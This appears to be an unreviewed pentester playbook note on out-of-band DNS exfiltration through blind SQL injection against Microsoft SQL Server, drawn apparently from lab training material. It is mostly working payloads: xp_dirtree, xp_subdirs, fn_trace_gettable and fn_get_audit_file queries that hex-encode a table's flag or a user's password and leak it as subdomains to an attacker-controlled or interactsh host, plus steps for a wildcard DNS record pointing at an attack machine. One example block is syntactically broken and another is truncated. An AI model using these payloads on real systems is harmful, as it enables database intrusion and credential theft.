---
technique: "Out-of-Band DNS"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/Out-of-Band DNS.md"
source_sha256: "bdfdddc446e3fbab7be3326a8db1f5ad49d0fad2108f35048d3ea6f41d994272"
curator_version: 2
review_status: imported-unreviewed
---

# Out-of-Band DNS

> Family: **injection** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `sql: # Setup`
- `sql: flag = "AB"`
- `sql: ';DECLARE @T VARCHAR(MAX);DECLARE @A VARCHAR(63);DECLARE @B VARCHAR(63);SELECT @T=CONVERT(`
- `sql: maria';`
- `sql: DECLARE @T VARCHAR(MAX);`
- `sql: DECLARE @T VARCHAR(MAX);`
- `sql: DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT`

## Playbook (operator notes)

# Out-of-Band DNS

## Theory

- Server sends data to a server we control as a subdomain
    - `<data>.burp_collab.oasitfy.com`
- Is more reliable and accurate than time-based SQL injections

---

## Techniques

- Technique varies from SQL languages
- Each technique requires a different permission, so they may not work in all cases

<aside>
💡

**Note:** Notice how in all of the above payloads we start by declaring `@T` as `VARCHAR` then add our query within it, and then we add it to the domain. This will become handy later on when we want to split `@T` into multiple strings so it fits as a sub-domain. It is also useful to ensure whatever result we get is a string, otherwise it may break our query.

</aside>

| SQL Function | SQL Query |
| --- | --- |
| `master..xp_dirtree` | `DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| `master..xp_fileexist` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| `master..xp_subdirs` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| `sys.dm_os_file_exists` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');` |
| `fn_trace_gettable` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);` |
| `fn_get_audit_file` | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);` |

*Replace 1234 with the data we want to exfiltrate and YOUR.DOMAIN with a collaborator Domain*

---

## Limitations

- Labels (part between dots) can be max `63` chars long and the entire domain max `253` chars
- We might need to `split` up data into multiple parts / requests + encode them in hex or base64

```sql
# Setup
DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63); 

SELECT @T=CONVERT(
	VARCHAR(MAX), 
	CONVERT(VARBINARY(MAX), flag), 1
) from flag; 

SELECT @A=SUBSTRING(@T,3,63);    # start at 3 (0x) and use 63 chars
SELECT @B=SUBSTRING(@T,3+63,63); # start at 66 (0x) and use 63 chars

# Technique
SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
```

- Query declares the variable `@T`, `@A`, and `@B`, then selects `flag` from the `flag` table into `@T`, split the result to `@A` and `@B`, and finally tries to access a URL `@A`.`@B`.`OUR_URL` which we can read through our DNS history

<aside>
💡

Because the first two chars are `0x` we start at position 3

```sql
flag = "AB"
VARBINARY = 0x4142
VARCHAR (style 1) = "0x4142"
```

</aside>

---

## Interact.sh

**CLI Version**

https://github.com/projectdiscovery/interactsh/releases/

Payload example:

```sql
';DECLARE @T VARCHAR(MAX);DECLARE @A VARCHAR(63);DECLARE @B VARCHAR(63);SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) FROM flag;SELECT @A=SUBSTRING(@T,3,63);SELECT @B=SUBSTRING(@T,3+63,63);EXEC('master..xp_subdirs "\\'+@A+'.'+@B+'.cegs9f52vtc0000z2jt0g8ecwzwyyyyyb.oast.fun\x"');--
```

## Burp

<aside>
💡

Note: Out-of-Band DNS exfiltration is `not unique to SQL injections`, but may also be used with other blind attacks to extract data or commands output, such as `blind XXE` (eXternal XML Entities) or blind `command injection`.

</aside>

---

## Using a Custom DNS Record

DNS Out-of-band data exfiltration is also possible when pentesting any organization's local network, and can be performed locally without going over the internet if we had access to the organization's local DNS server. Furthermore, we may still carry the attack over the internet without relying on `Interact.sh` and `Burp Collaborator` by creating a custom DNS record with any ISP or DNS authority.

The VM below has a DNS server setup that allows us to add new domain names, which simulates a DNS authority in real-life that we would use to add new DNS records/domains.

Next, we can add an `A` record that forwards requests to our attack machine IP. We can keep the name as `@` (wild card to match any sub-domain/record), select the type `A` (IPv4 DNS record), and set our machine's IP address:

---

### Example

First, let's carry a test attack to ensure the attacks works as expected, as this is an essential step when performing any blind attack, since it is more difficult to identify potential issues later on. Since we are not interested in doing a `Boolean SQL Injection` attack, we will not be using `AND` this time, and will simply inject our above query with a `maria';`:

```sql
maria';
DECLARE @T VARCHAR(1024);
SELECT @T=(SELECT 1234);
SELECT * FROM fn_trace_gettable('\\'+@T+'.blindsqli.academy.htb\x.trc',DEFAULT);
--+-
```

Now, we need to check the DNS logs to confirm that a DNS request was sent with the `1234` sub-domain.

Replace the 1234 with actual data now:
`SELECT password from users WHERE username="maria";`

**Note:** We should always ensure that whatever query we choose only returns `1` result, or our attack may not work correctly and we would need to `concatenate` all results into a single string.

Of course, we still need to encode the result, as it may contain non-ASCII characters which would not comply with DNS rules and will break our attack. So, we replace the `@T` declaration with the following (as shown earlier):

```sql
DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63); 

SELECT @T=CONVERT(
	VARCHAR(MAX), 
	CONVERT(VARBINARY(MAX), password), 1
) from users WHERE username="maria"; 

SELECT @A=SUBSTRING(@T,3,63); 
SELECT @B=SUBSTRING(@T,3+63,63);

SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
```

```sql
DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63);

SELECT @T=CONVERT(
	VARCHAR(MAX), 
	CONVERT(VARBINARY(MAX), flag), 1
) from SELECT 1234;

SELECT @A=SUBSTRING(@T,3,63); 
SELECT @B=SUBSTRING(@T,3+63,63);
EXEC('master..xp_subdirs "\'+@T+'.example.com\x"');
```

```sql
DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) from users WHERE username="maria"; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63);
```

## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/Out-of-Band DNS.md`
